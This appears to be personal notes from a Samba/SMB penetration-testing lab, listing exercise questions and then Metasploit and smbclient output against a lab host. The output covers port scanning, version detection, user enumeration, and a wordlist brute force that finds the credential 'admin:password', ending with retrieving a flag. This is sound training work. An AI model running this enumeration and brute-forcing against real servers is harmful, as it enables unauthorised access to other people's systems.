@@ -1,0 +1,59 @@
+Smb is server messafe block (network file sharing protocol)
+port no: 445 and netbios using Port no:139
+Samba is the linux implementation of smb and allows windows system to access Linux share and devices
+
+Find the default tcp ports used by smbd.
+Find the default udp ports used by nmbd.
+What is the workgroup name of samba server?
+Find the exact version of samba server by using appropriate nmap script.
+Find the exact version of samba server by using smb_version metasploit module.
+What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
+Find the NetBIOS computer name of samba server using nmblookup
+Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.
+Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
+
+Solutions:
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+[+] 192.165.35.3:         - 192.165.35.3:139 - TCP OPEN
+[+] 192.165.35.3:         - 192.165.35.3:445 - TCP OPEN
+ 
+38  auxiliary/scanner/smb/smb_version
+*] 192.165.35.3:445      -   Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
+that ubuntu is correct
+37 auxiliary/scanner/smb/smb_enumusers //trying to enumerate usernames
+
+msf6 auxiliary(scanner/smb/smb_enumusers) > run
+
+[*] 192.165.35.3:445 - Using automatically identified domain: SAMBA-RECON
+[+] 192.165.35.3:445 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
+[+] 192.165.35.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
+[*] 192.165.35.3:445 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+list of users john elie aisha shawn emma admin 
+
+34  auxiliary/scanner/smb/smb_enumshares
+may be we will get extra data
+set rhost target ip
+set showfiles true
+
+24  auxiliary/scanner/smb/smb_login 
+set rhost target ip
+set pass_file <metasploit wordlist: /usr/share/metasploit-framework/data/unix_passwords.txt
+run [+] 192.165.35.3:445      - 192.165.35.3:445 - Success: '.\admin:password'
+login
+smbclient -L \\\\target_ip\\ -U <username>
+password:
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        RECONLABS            SAMBA-RECON
+
+
+we get the net bios name samba-recon
+smbclient -L \\\\target_ip\\sharename -U <username>
+ls
+get flag
+you will get flag
